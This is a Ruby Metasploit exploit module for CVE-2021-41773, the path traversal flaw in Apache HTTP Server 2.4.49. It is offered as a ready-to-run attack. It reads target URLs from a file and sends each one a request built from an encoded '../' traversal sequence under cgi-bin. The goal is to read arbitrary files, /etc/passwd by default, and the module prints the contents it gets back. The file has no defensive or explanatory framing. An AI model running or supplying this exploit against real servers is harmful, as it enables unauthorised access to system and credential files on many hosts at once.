require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apache HTTP Server 2.4.49 Path Traversal',
        'Description' => %q{
          This module exploits the Path Traversal vulnerability in Apache HTTP Server 2.4.49 (CVE-2021-41773).
        },
        'License' => MSF_LICENSE,
        'Author' => "taha-ishaq",
        'References' => [
          ['CVE', '2021-41773']
        ],
        'Platform' => ['unix', 'linux', 'windows'],
        'Targets' => [['Automatic', {}]],
        'DefaultTarget' => 0
      )
    )

    register_options([
      OptString.new('TARGETS_FILE', [true, 'Path to the file containing target URLs', '']),
      OptString.new('TRAVERSAL_PATH', [true, 'Path to traverse', '/etc/passwd'])
    ])
  end

  def exploit
    targets_file = datastore['TARGETS_FILE']
    traversal_path = datastore['TRAVERSAL_PATH']

    unless targets_file && File.exist?(targets_file)
      fail_with(Failure::BadConfig, "#{targets_file} is not a valid file.")
    end

    print_status("Attempting to exploit #{datastore['RHOSTS']}...")

    File.foreach(targets_file) do |url|
      url.chomp!
      res = send_request_cgi(
        'method' => 'GET',
        'uri' => normalize_uri(url, 'cgi-bin', '.%2e', '%2e%2e', '%2e%2e', '%2e%2e', '%2e%2e', '%2e%2e', '%2e%2e', '%2e%2e', '%2e%2e', traversal_path)
      )

      if res && res.code == 200
        print_good("Successful traversal at #{url}: #{res.body}")
      else
        print_error("Failed to exploit #{url}")
      end
    end
  end
end
